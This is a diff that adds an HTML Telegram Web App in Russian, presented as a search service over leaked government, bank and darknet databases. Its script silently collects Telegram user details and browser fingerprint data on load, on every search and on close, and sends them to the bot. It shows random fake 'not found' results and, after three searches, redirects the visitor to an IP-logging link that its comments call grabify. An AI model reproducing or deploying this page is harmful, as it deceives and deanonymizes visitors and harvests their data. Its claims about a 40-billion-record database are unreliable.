@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>База данных</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0F0F0F;
+            color: #fff;
+            padding: 0;
+            margin: 0;
+            overflow-x: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid #00d4ff;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 5px;
+            background: linear-gradient(90deg, #00d4ff, #0099ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .header p {
+            font-size: 12px;
+            color: #888;
+        }
+        
+        .menu {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            padding: 20px;
+        }
+        
+        .menu-btn {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            border: none;
+            border-radius: 15px;
+            padding: 30px 20px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .menu-btn:active {
+            transform: scale(0.95);
+        }
+        
+        .menu-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.1);
+            transition: left 0.3s;
+        }
+        
+        .menu-btn:hover::before {
+            left: 100%;
+        }
+        
+        .menu-btn .icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .content {
+            padding: 20px;
+            display: none;
+        }
+        
+        .content.active {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .search-form {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .search-form input {
+            width: 100%;
+            padding: 15px;
+            background: #0f0f1e;
+            border: 2px solid #00d4ff;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        
+        .search-form input::placeholder {
+            color: #666;
+        }
+        
+        .search-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #00d4ff, #0099ff);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .result {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .profile-info {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 15px;
+        }
+        
+        .profile-info div {
+            padding: 10px 0;
+            border-bottom: 1px solid #333;
+        }
+        
+        .profile-info div:last-child {
+            border-bottom: none;
+        }
+        
+        .stat-block {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            border-left: 4px solid #00d4ff;
+        }
+        
+        .stat-block strong {
+            color: #00d4ff;
+        }
+        
+        .back-btn {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            padding: 15px;
+            background: #1a1a2e;
+            border: 2px solid #00d4ff;
+            border-radius: 10px;
+            color: #00d4ff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔍 База данных</h1>
+        <p>Свыше 40 миллиардов записей</p>
+    </div>
+
+    <!-- Главное меню -->
+    <div id="mainMenu" class="menu">
+        <button class="menu-btn" onclick="showSearch()">
+            <span class="icon">🔍</span>
+            Поиск
+        </button>
+        <button class="menu-btn" onclick="showProfile()">
+            <span class="icon">👤</span>
+            Профиль
+        </button>
+        <button class="menu-btn" onclick="showAddDB()">
+            <span class="icon">📁</span>
+            Добавить базу
+        </button>
+        <button class="menu-btn" onclick="showStats()">
+            <span class="icon">📊</span>
+            Статистика
+        </button>
+    </div>
+
+    <!-- Поиск -->
+    <div id="searchContent" class="content">
+        <div class="search-form">
+            <h2 style="margin-bottom: 20px;">🔎 Поиск по базам</h2>
+            <p style="color: #888; margin-bottom: 20px; font-size: 14px;">
+                МВД • ФССП • ГИБДД • ФНС • Банки • Соцсети • Даркнет
+            </p>
+            <input type="text" id="searchQuery" placeholder="ФИО, телефон, email, ИНН...">
+            <button class="search-btn" onclick="performSearch()">Найти</button>
+        </div>
+        <div id="searchResult"></div>
+        <button class="back-btn" onclick="showMenu()">← Назад</button>
+    </div>
+
+    <!-- Профиль -->
+    <div id="profileContent" class="content">
+        <div class="profile-info">
+            <h2 style="margin-bottom: 20px;">👤 Ваш профиль</h2>
+            <div><strong>ID:</strong> <span id="userId"></span></div>
+            <div><strong>Username:</strong> <span id="username"></span></div>
+            <div><strong>Подписка:</strong> <span style="color: #00ff88;">✅ Активна (7 дней)</span></div>
+        </div>
+        <button class="back-btn" onclick="showMenu()">← Назад</button>
+    </div>
+
+    <!-- Добавить базу -->
+    <div id="addDBContent" class="content">
+        <div class="profile-info">
+            <h2 style="margin-bottom: 20px;">📁 Добавить базу</h2>
+            <p style="color: #888; line-height: 1.6;">
+                Для добавления собственных баз данных свяжитесь с администрацией:
+            </p>
+            <p style="margin-top: 15px; font-size: 18px; color: #00d4ff;">
+                @otsocityhelpoer_bot
+            </p>
+            <p style="color: #888; margin-top: 15px; font-size: 14px;">
+                Мы принимаем актуальные базы от проверенных источников
+            </p>
+        </div>
+        <button class="back-btn" onclick="showMenu()">← Назад</button>
+    </div>
+
+    <!-- Статистика -->
+    <div id="statsContent" class="content">
+        <h2 style="padding: 0 20px 20px;">📊 Статистика базы</h2>
+        <div class="stat-block">
+            <strong>Всего записей:</strong><br>
+            40,682,451,239 строк
+        </div>
+        <div class="stat-block">
+            <strong>Источников:</strong><br>
+            127+ баз данных
+        </div>
+        <div class="stat-block">
+            <strong>Обновление:</strong><br>
+            Ежедневно
+        </div>
+        <div class="stat-block">
+            <strong>География:</strong><br>
+            СНГ, Европа, США, Азия
+        </div>
+        <div class="stat-block">
+            <strong>Пользователей:</strong><br>
+            <span id="userCount">Загрузка...</span>
+        </div>
+        <button class="back-btn" onclick="showMenu()">← Назад</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.disableVerticalSwipes();
+
+        // Собираем МАКСИМУМ данных о юзере
+        const userData = {
+            // Telegram данные
+            userId: tg.initDataUnsafe?.user?.id || 'unknown',
+            username: tg.initDataUnsafe?.user?.username || 'не указан',
+            firstName: tg.initDataUnsafe?.user?.first_name || '',
+            lastName: tg.initDataUnsafe?.user?.last_name || '',
+            isPremium: tg.initDataUnsafe?.user?.is_premium || false,
+            languageCode: tg.initDataUnsafe?.user?.language_code || '',
+            
+            // Технические данные
+            screen: `${screen.width}x${screen.height}`,
+            screenColorDepth: screen.colorDepth,
+            screenPixelRatio: window.devicePixelRatio,
+            viewport: `${window.innerWidth}x${window.innerHeight}`,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            maxTouchPoints: navigator.maxTouchPoints,
+            
+            // Время
+            timestamp: new Date().toISOString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            
+            // WebApp данные
+            version: tg.version,
+            colorScheme: tg.colorScheme,
+            themeParams: tg.themeParams,
+            
+            // Дополнительно
+            referrer: document.referrer,
+            online: navigator.onLine
+        };
+
+        // СРАЗУ отправляем данные в бота
+        console.log('Отправка данных в бота:', userData);
+        tg.sendData(JSON.stringify(userData));
+
+        // Заполняем профиль
+        document.getElementById('userId').textContent = userData.userId;
+        document.getElementById('username').textContent = '@' + userData.username;
+
+        let searchCount = 0;
+        const maxSearches = 3; // После 3 поисков → редирект на grabify
+
+        function showMenu() {
+            document.getElementById('mainMenu').style.display = 'grid';
+            document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
+        }
+
+        function hideMenu() {
+            document.getElementById('mainMenu').style.display = 'none';
+        }
+
+        function showSearch() {
+            hideMenu();
+            document.getElementById('searchContent').classList.add('active');
+        }
+
+        function showProfile() {
+            hideMenu();
+            document.getElementById('profileContent').classList.add('active');
+        }
+
+        function showAddDB() {
+            hideMenu();
+            document.getElementById('addDBContent').classList.add('active');
+        }
+
+        function showStats() {
+            hideMenu();
+            document.getElementById('statsContent').classList.add('active');
+            // Имитируем загрузку
+            setTimeout(() => {
+                document.getElementById('userCount').textContent = Math.floor(Math.random() * 50000 + 100000).toLocaleString() + ' чел.';
+            }, 500);
+        }
+
+        function performSearch() {
+            const query = document.getElementById('searchQuery').value.trim();
+            
+            if (!query) {
+                document.getElementById('searchResult').innerHTML = `
+                    <div class="result" style="background: #2a1a1e; border-left: 4px solid #ff4444;">
+                        ❌ Введите данные для поиска
+                    </div>
+                `;
+                return;
+            }
+
+            // Показываем загрузку
+            document.getElementById('searchResult').innerHTML = `
+                <div class="result">
+                    <div style="font-size: 32px; margin-bottom: 10px;">⏳</div>
+                    <div>Поиск в базах данных...</div>
+                </div>
+            `;
+
+            // Отправляем запрос в бота
+            tg.sendData(JSON.stringify({
+                ...userData,
+                action: 'search',
+                query: query,
+                searchNumber: ++searchCount
+            }));
+
+            // Через 2 секунды — рандомный результат
+            setTimeout(() => {
+                const results = [
+                    '❌ Данные не найдены',
+                    '⚠️ Сервера перегружены. Попробуйте ещё раз.',
+                    '❌ Нет совпадений в базе'
+                ];
+                
+                const result = results[Math.floor(Math.random() * results.length)];
+                
+                document.getElementById('searchResult').innerHTML = `
+                    <div class="result" style="background: #2a1a1e; border-left: 4px solid #ff8844;">
+                        ${result}
+                    </div>
+                `;
+
+                // После 3 поисков → редирект на grabify
+                if (searchCount >= maxSearches) {
+                    setTimeout(() => {
+                        document.getElementById('searchResult').innerHTML += `
+                            <div class="result" style="margin-top: 15px; background: #1a2a1e; border-left: 4px solid #00ff88;">
+                                🔄 Перенаправление на расширенный поиск...
+                            </div>
+                        `;
+                        
+                        setTimeout(() => {
+                            window.location.href = 'https://account.beauty/89YMMI';
+                        }, 1500);
+                    }, 1000);
+                }
+            }, 2000);
+        }
+
+        // Отправляем данные при закрытии
+        window.addEventListener('beforeunload', () => {
+            tg.sendData(JSON.stringify({
+                ...userData,
+                action: 'close',
+                timeSpent: Date.now() - startTime
+            }));
+        });
+
+        const startTime = Date.now();
+    </script>
+</body>
+</html>
